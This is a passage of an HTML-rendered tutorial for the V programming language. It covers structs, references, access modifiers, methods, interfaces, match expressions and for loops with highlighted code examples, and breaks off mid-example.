<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span><span style="color:#66d9ef">struct</span> <span style="color:#a6e22e">Point</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">x</span> <span style="color:#66d9ef">int</span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">y</span> <span style="color:#66d9ef">int</span>
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">mut</span> <span style="color:#a6e22e">p</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">Point</span>{
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">x</span>: <span style="color:#ae81ff">10</span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">y</span>: <span style="color:#ae81ff">20</span>
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>println(<span style="color:#a6e22e">p</span>.<span style="color:#a6e22e">x</span>) <span style="color:#75715e">// Struct fields are accessed using a dot</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">// Alternative literal syntax</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">p</span> = <span style="color:#a6e22e">Point</span>{<span style="color:#ae81ff">10</span>, <span style="color:#ae81ff">20</span>}
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">assert</span> <span style="color:#a6e22e">p</span>.<span style="color:#a6e22e">x</span> <span style="color:#f92672">==</span> <span style="color:#ae81ff">10</span>
</span></span></code></pre></div><blockquote>
<p>Structs are allocated on the stack. To allocate a struct on the heap and get a <a href="https://docs.vlang.io/references.html">reference</a> to it, use the <code>&amp;</code> prefix:</p>
</blockquote>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span><span style="color:#66d9ef">struct</span> <span style="color:#a6e22e">Point</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">x</span> <span style="color:#66d9ef">int</span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">y</span> <span style="color:#66d9ef">int</span>
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">p</span> <span style="color:#f92672">:=</span> <span style="color:#f92672">&amp;</span><span style="color:#a6e22e">Point</span>{<span style="color:#ae81ff">10</span>, <span style="color:#ae81ff">10</span>}
</span></span><span style="display:flex;"><span><span style="color:#75715e">// References have the same syntax for accessing fields</span>
</span></span><span style="display:flex;"><span>println(<span style="color:#a6e22e">p</span>.<span style="color:#a6e22e">x</span>)
</span></span></code></pre></div><p>The type of p is &amp;Point. It&rsquo;s a <em>reference</em> to Point. References are similar to Go pointers and C++ references.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span><span style="color:#66d9ef">struct</span> <span style="color:#a6e22e">Foo</span> {
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">mut</span>:
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">x</span> <span style="color:#66d9ef">int</span>
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">fa</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">Foo</span>{<span style="color:#ae81ff">1</span>}
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">mut</span> <span style="color:#a6e22e">a</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">fa</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">a</span>.<span style="color:#a6e22e">x</span> = <span style="color:#ae81ff">2</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">assert</span> <span style="color:#a6e22e">fa</span>.<span style="color:#a6e22e">x</span> <span style="color:#f92672">==</span> <span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">assert</span> <span style="color:#a6e22e">a</span>.<span style="color:#a6e22e">x</span> <span style="color:#f92672">==</span> <span style="color:#ae81ff">2</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">// fb := Foo{ 1 }</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">// mut b := &amp;fb  // error: `fb` is immutable, cannot have a mutable reference to it</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">// b.x = 2</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">mut</span> <span style="color:#a6e22e">fc</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">Foo</span>{<span style="color:#ae81ff">1</span>}
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">mut</span> <span style="color:#a6e22e">c</span> <span style="color:#f92672">:=</span> <span style="color:#f92672">&amp;</span><span style="color:#a6e22e">fc</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">c</span>.<span style="color:#a6e22e">x</span> = <span style="color:#ae81ff">2</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">assert</span> <span style="color:#a6e22e">fc</span>.<span style="color:#a6e22e">x</span> <span style="color:#f92672">==</span> <span style="color:#ae81ff">2</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">assert</span> <span style="color:#a6e22e">c</span>.<span style="color:#a6e22e">x</span> <span style="color:#f92672">==</span> <span style="color:#ae81ff">2</span>
</span></span><span style="display:flex;"><span>println(<span style="color:#a6e22e">fc</span>) <span style="color:#75715e">// Foo{ x: 2 }</span>
</span></span><span style="display:flex;"><span>println(<span style="color:#a6e22e">c</span>) <span style="color:#75715e">// &amp;Foo{ x: 2 } // Note `&amp;` prefixed.</span>
</span></span></code></pre></div><p><strong>Default field</strong> values can be assigned during Struct definition.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span><span style="color:#66d9ef">struct</span> <span style="color:#a6e22e">Foo</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">n</span>   <span style="color:#66d9ef">int</span>    <span style="color:#75715e">// n is 0 by default</span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">s</span>   <span style="color:#66d9ef">string</span> <span style="color:#75715e">// s is &#39;&#39; by default</span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">a</span>   []<span style="color:#66d9ef">int</span>  <span style="color:#75715e">// a is `[]int{}` by default</span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">pos</span> <span style="color:#66d9ef">int</span> = <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span> <span style="color:#75715e">// custom default value</span>
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>All struct fields are zeroed by default during the creation of the struct. Array and map fields are allocated. In case of reference value, see <a href="https://docs.vlang.io/structs-with-reference-fields.html">here</a>.</p>
<p>You can mark a struct field with the <code>[required]</code> attribute, to tell V that that field must be initialized when creating an instance of that struct.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span><span style="color:#66d9ef">struct</span> <span style="color:#a6e22e">Foo</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">n</span> <span style="color:#66d9ef">int</span> <span style="color:#960050;background-color:#1e0010">@</span>[<span style="color:#a6e22e">required</span>]
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><h4 id="struct-access-modifiers">Struct Access modifiers</h4>
<p>Struct fields are <strong>private and immutable by default</strong> (making structs immutable as well). Their access modifiers can be changed with pub and mut. In total, there are 5 possible options:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span><span style="color:#66d9ef">struct</span> <span style="color:#a6e22e">Foo</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">a</span> <span style="color:#66d9ef">int</span> <span style="color:#75715e">// private immutable (default)</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">mut</span>:
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">b</span> <span style="color:#66d9ef">int</span> <span style="color:#75715e">// private mutable</span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">c</span> <span style="color:#66d9ef">int</span> <span style="color:#75715e">// (you can list multiple fields with the same access modifier)</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">pub</span>:
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">d</span> <span style="color:#66d9ef">int</span> <span style="color:#75715e">// public immutable (readonly)</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">pub</span> <span style="color:#a6e22e">mut</span>:
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">e</span> <span style="color:#66d9ef">int</span> <span style="color:#75715e">// public, but mutable only in parent module</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">__global</span>:
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// (not recommended to use, that&#39;s why the &#39;global&#39; keyword starts with __)</span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">f</span> <span style="color:#66d9ef">int</span> <span style="color:#75715e">// public and mutable both inside and outside parent module</span>
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><h4 id="methods-for-structs">Methods for structs</h4>
<p>V doesn&rsquo;t have classes, but you can define methods on types. A method is a function with a special <strong><code>receiver</code></strong> argument. The <strong>receiver</strong> appears in its own argument list <strong>between the <code>fn</code> keyword and the method name</strong>. Methods must be in the same module as the receiver type.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span><span style="color:#66d9ef">struct</span> <span style="color:#a6e22e">User</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">age</span> <span style="color:#66d9ef">int</span>
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">fn</span> (<span style="color:#a6e22e">u</span> <span style="color:#a6e22e">User</span>) <span style="color:#a6e22e">can_register</span>() <span style="color:#66d9ef">bool</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">u</span>.<span style="color:#a6e22e">age</span> &gt; <span style="color:#ae81ff">16</span>
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">user</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">User</span>{
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">age</span>: <span style="color:#ae81ff">10</span>
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>println(<span style="color:#a6e22e">user</span>.<span style="color:#a6e22e">can_register</span>()) <span style="color:#75715e">// &#34;false&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">user2</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">User</span>{
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">age</span>: <span style="color:#ae81ff">20</span>
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>println(<span style="color:#a6e22e">user2</span>.<span style="color:#a6e22e">can_register</span>()) <span style="color:#75715e">// &#34;true&#34;</span>
</span></span></code></pre></div><p>In this example, the <code>can_register</code> method has a receiver of type <code>User</code> named <code>u</code>. The convention is not to use receiver names like <code>self</code> or <code>this</code>, but a short, preferably one letter long, name.</p>
<h4 id="static-type-methods-for-structs">Static type methods for structs</h4>
<p>V supports static type methods like <code>User.new()</code>. These are defined on a struct via <code>fn [Type name].[function name]</code> and allow to organize all functions related to a struct:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span><span style="color:#66d9ef">struct</span> <span style="color:#a6e22e">User</span> {}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">fn</span> <span style="color:#a6e22e">User</span>.new() <span style="color:#a6e22e">User</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">User</span>{}
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">user</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">User</span>.new()
</span></span></code></pre></div><h4 id="interfaces">Interfaces</h4>
<p>An interface can be considered as a blueprint that defines an expected set of actions that any concrete implementation must fulfill in order to be considered a type of that interface. Unlike Go, but like TypeScript, V&rsquo;s interfaces can define both fields and methods.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span><span style="color:#66d9ef">interface</span> <span style="color:#a6e22e">Speaker</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">breed</span> <span style="color:#66d9ef">string</span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">speak</span>() <span style="color:#66d9ef">string</span>
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>A type implements an interface by implementing its methods and fields. In the following code, both <code>Dog</code> and <code>Cat</code> struct have a <code>breed</code> attribute and a <code>speak()</code> method which allows them to adhere to requirements to be considered as a <code>Speaker</code> type.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span><span style="color:#66d9ef">struct</span> <span style="color:#a6e22e">Dog</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">breed</span> <span style="color:#66d9ef">string</span>
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">fn</span> (<span style="color:#a6e22e">d</span> <span style="color:#a6e22e">Dog</span>) <span style="color:#a6e22e">speak</span>() <span style="color:#66d9ef">string</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#960050;background-color:#1e0010">&#39;</span><span style="color:#a6e22e">woof</span><span style="color:#960050;background-color:#1e0010">&#39;</span>
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">struct</span> <span style="color:#a6e22e">Cat</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">breed</span> <span style="color:#66d9ef">string</span>
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">fn</span> (<span style="color:#a6e22e">c</span> <span style="color:#a6e22e">Cat</span>) <span style="color:#a6e22e">speak</span>() <span style="color:#66d9ef">string</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#960050;background-color:#1e0010">&#39;</span><span style="color:#a6e22e">meow</span><span style="color:#960050;background-color:#1e0010">&#39;</span>
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">fn</span> <span style="color:#a6e22e">main</span>() {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">dog</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">Dog</span>{<span style="color:#960050;background-color:#1e0010">&#39;</span><span style="color:#a6e22e">Leonberger</span><span style="color:#960050;background-color:#1e0010">&#39;</span>}
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">cat</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">Cat</span>{<span style="color:#960050;background-color:#1e0010">&#39;</span><span style="color:#a6e22e">Siamese</span><span style="color:#960050;background-color:#1e0010">&#39;</span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">mut</span> <span style="color:#a6e22e">arr</span> <span style="color:#f92672">:=</span> []<span style="color:#a6e22e">Speaker</span>{}
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">arr</span> <span style="color:#f92672">&lt;&lt;</span> <span style="color:#a6e22e">dog</span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">arr</span> <span style="color:#f92672">&lt;&lt;</span> <span style="color:#a6e22e">cat</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> <span style="color:#a6e22e">item</span> <span style="color:#a6e22e">in</span> <span style="color:#a6e22e">arr</span> {
</span></span><span style="display:flex;"><span>        println(<span style="color:#960050;background-color:#1e0010">&#39;</span><span style="color:#a6e22e">a</span> <span style="color:#960050;background-color:#1e0010">$</span>{<span style="color:#a6e22e">item</span>.<span style="color:#a6e22e">breed</span>} <span style="color:#a6e22e">says</span>: <span style="color:#960050;background-color:#1e0010">$</span>{<span style="color:#a6e22e">item</span>.<span style="color:#a6e22e">speak</span>()}<span style="color:#960050;background-color:#1e0010">&#39;</span>)
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>To learn more about interfaces, you can reference <a href="https://docs.vlang.io/type-declarations.html#interfaces">this documentation</a>.</p>
<h3 id="control-structures">Control Structures</h3>
<h4 id="if">If</h4>
<p><code>if</code> statements are pretty straightforward and similar to most other languages. Unlike other C-like languages, there are no parentheses surrounding the condition and the braces are always required.</p>
<pre tabindex="0"><code>a := 10
b := 20
if a &lt; b {
    println(&#39;${a} &lt; ${b}&#39;)
} else if a &gt; b {
    println(&#39;${a} &gt; ${b}&#39;)
} else {
    println(&#39;${a} == ${b}&#39;)
}
</code></pre><h4 id="if-expressions"><code>If</code> expressions</h4>
<p>Unlike C, V does not have a ternary operator, that would allow you to do: <code>x = c ? 1 : 2</code> . Instead, it has a bit more verbose, but also clearer to read, ability to use if as an expression. The direct translation in V of the ternary construct above, assuming c is a boolean condition, would be: <code>x = if c { 1 } else { 2 }</code>.</p>
<p>You can use multiple statements in each of the branches of an if expression, followed by a final value, that will become the value of the entire if expression, when it takes that branch:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span><span style="color:#a6e22e">n</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">arguments</span>().<span style="color:#a6e22e">len</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">x</span> <span style="color:#f92672">:=</span> <span style="color:#66d9ef">if</span> <span style="color:#a6e22e">n</span> &gt; <span style="color:#ae81ff">2</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">dump</span>(<span style="color:#a6e22e">arguments</span>())
</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">42</span>
</span></span><span style="display:flex;"><span>} <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>    println(<span style="color:#960050;background-color:#1e0010">&#39;</span><span style="color:#a6e22e">something</span> <span style="color:#66d9ef">else</span><span style="color:#960050;background-color:#1e0010">&#39;</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">100</span>
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">dump</span>(<span style="color:#a6e22e">x</span>)
</span></span></code></pre></div><h4 id="match">Match</h4>
<p>A match statement is a shorter way to write a sequence of <code>if - else</code> statements. When a matching branch is found, the following statement block will be run. The else branch will be run when no other branches match.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span><span style="color:#a6e22e">os</span> <span style="color:#f92672">:=</span> <span style="color:#960050;background-color:#1e0010">&#39;</span><span style="color:#a6e22e">windows</span><span style="color:#960050;background-color:#1e0010">&#39;</span>
</span></span><span style="display:flex;"><span>print(<span style="color:#960050;background-color:#1e0010">&#39;</span><span style="color:#a6e22e">V</span> <span style="color:#a6e22e">is</span> <span style="color:#a6e22e">running</span> <span style="color:#a6e22e">on</span> <span style="color:#960050;background-color:#1e0010">&#39;</span>)
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">match</span> <span style="color:#a6e22e">os</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#960050;background-color:#1e0010">&#39;</span><span style="color:#a6e22e">darwin</span><span style="color:#960050;background-color:#1e0010">&#39;</span> { println(<span style="color:#960050;background-color:#1e0010">&#39;</span><span style="color:#a6e22e">macOS</span>.<span style="color:#960050;background-color:#1e0010">&#39;</span>) }
</span></span><span style="display:flex;"><span>    <span style="color:#960050;background-color:#1e0010">&#39;</span><span style="color:#a6e22e">linux</span><span style="color:#960050;background-color:#1e0010">&#39;</span> { println(<span style="color:#960050;background-color:#1e0010">&#39;</span><span style="color:#a6e22e">Linux</span>.<span style="color:#960050;background-color:#1e0010">&#39;</span>) }
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span> { println(<span style="color:#a6e22e">os</span>) }
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span><span style="color:#a6e22e">number</span> <span style="color:#f92672">:=</span> <span style="color:#ae81ff">2</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">s</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">match</span> <span style="color:#a6e22e">number</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">1</span> { <span style="color:#960050;background-color:#1e0010">&#39;</span><span style="color:#a6e22e">one</span><span style="color:#960050;background-color:#1e0010">&#39;</span> }
</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">2</span> { <span style="color:#960050;background-color:#1e0010">&#39;</span><span style="color:#a6e22e">two</span><span style="color:#960050;background-color:#1e0010">&#39;</span> }
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span> { <span style="color:#960050;background-color:#1e0010">&#39;</span><span style="color:#a6e22e">many</span><span style="color:#960050;background-color:#1e0010">&#39;</span> }
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><h4 id="in-operator"><code>in</code> operator</h4>
<p><code>in</code> allows to check whether an array or a map contains an element. To do the opposite, use <code>!in</code>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span><span style="color:#a6e22e">nums</span> <span style="color:#f92672">:=</span> [<span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">3</span>]
</span></span><span style="display:flex;"><span>println(<span style="color:#ae81ff">1</span> <span style="color:#a6e22e">in</span> <span style="color:#a6e22e">nums</span>) <span style="color:#75715e">// true</span>
</span></span><span style="display:flex;"><span>println(<span style="color:#ae81ff">4</span> !<span style="color:#a6e22e">in</span> <span style="color:#a6e22e">nums</span>) <span style="color:#75715e">// true</span>
</span></span></code></pre></div><h4 id="for-loops"><code>for</code> loops</h4>
<p>V has only one looping keyword: <code>for</code>, with several forms.</p>
<p><code>for</code>/<code>in</code> is the most common form. You can use it with an array, map or numeric range. The <code>for value in arr</code> form is used for going through elements of an array. If an index is required, an alternative form <code>for index, value in arr</code> can be used.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span><span style="color:#a6e22e">numbers</span> <span style="color:#f92672">:=</span> [<span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">3</span>, <span style="color:#ae81ff">4</span>, <span style="color:#ae81ff">5</span>]
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> <span style="color:#a6e22e">num</span> <span style="color:#a6e22e">in</span> <span style="color:#a6e22e">numbers</span> {
</span></span><span style="display:flex;"><span>    println(<span style="color:#a6e22e">num</span>)
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">names</span> <span style="color:#f92672">:=</span> [<span style="color:#960050;background-color:#1e0010">&#39;</span><span style="color:#a6e22e">Sam</span><span style="color:#960050;background-color:#1e0010">&#39;</span>, <span style="color:#960050;background-color:#1e0010">&#39;</span><span style="color:#a6e22e">Peter</span><span style="color:#960050;background-color:#1e0010">&#39;</span>]
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> <span style="color:#a6e22e">i</span>, <span style="color:#a6e22e">name</span> <span style="color:#a6e22e">in</span> <span style="color:#a6e22e">names</span> {
</span></span><span style="display:flex;"><span>    println(<span style="color:#960050;background-color:#1e0010">&#39;$</span>{<span style="color:#a6e22e">i</span>}) <span style="color:#960050;background-color:#1e0010">$</span>{<span style="color:#a6e22e">name</span>}<span style="color:#960050;background-color:#1e0010">&#39;</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// Output: 0) Sam</span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">//         1) Peter</span>
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>Note that the value is read-only. If you need to modify the array while looping, you need to declare the element as mutable:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span><span style="color:#a6e22e">mut</span> <span style="color:#a6e22e">numbers</span> <span style="color:#f92672">:=</span> [<span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">2</span>]
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> <span style="color:#a6e22e">mut</span> <span style="color:#a6e22e">num</span> <span style="color:#a6e22e">in</span> <span style="color:#a6e22e">numbers</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">num</span><span style="color:#f92672">++</span>
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>println(<span style="color:#a6e22e">numbers</span>) <span style="color:#75715e">// [1, 2, 3]</span>
</span></span></code></pre></div><p><strong>By default, array elements are taken by value, if you need elements to be taken by reference, use <code>&amp;</code> on the array you want to iterate over:</strong></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span><span style="color:#66d9ef">struct</span> <span style="color:#a6e22e">User</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">name</span> <span style="color:#66d9ef">string</span>
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">users</span> <span style="color:#f92672">:=</span> [<span style="color:#a6e22e">User</span>{
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">name</span>: <span style="color:#960050;background-color:#1e0010">&#39;</span><span style="color:#a6e22e">someuserwow99</span><span style="color:#960050;background-color:#1e0010">&#39;</span>
</span></span><span style="display:flex;"><span>}, <span style="color:#a6e22e">User</span>{
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">name</span>: <span style="color:#960050;background-color:#1e0010">&#39;</span><span style="color:#a6e22e">visgod</span><span style="color:#960050;background-color:#1e0010">&#39;</span>
</span></span><span style="display:flex;"><span>}]
</span></span><span style="display:flex;"><span><span style="color:#75715e">// note `&amp;users`, this is how a reference to the elements of the array is received</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> <span style="color:#a6e22e">user</span> <span style="color:#a6e22e">in</span> <span style="color:#f92672">&amp;</span><span style="color:#a6e22e">users</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// some operations with `user`</span>
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>The same applies to maps.</p>
<p>When an identifier is just a single underscore, it is ignored.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span><span style="color:#a6e22e">m</span> <span style="color:#f92672">:=</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#960050;background-color:#1e0010">&#39;</span><span style="color:#a6e22e">one</span><span style="color:#960050;background-color:#1e0010">&#39;</span>: <span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span>    <span style="color:#960050;background-color:#1e0010">&#39;</span><span style="color:#a6e22e">two</span><span style="color:#960050;background-color:#1e0010">&#39;</span>: <span style="color:#ae81ff">2</span>
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> <span style="color:#a6e22e">key</span>, <span style="color:#a6e22e">value</span> <span style="color:#a6e22e">in</span> <span style="color:#a6e22e">m</span> {
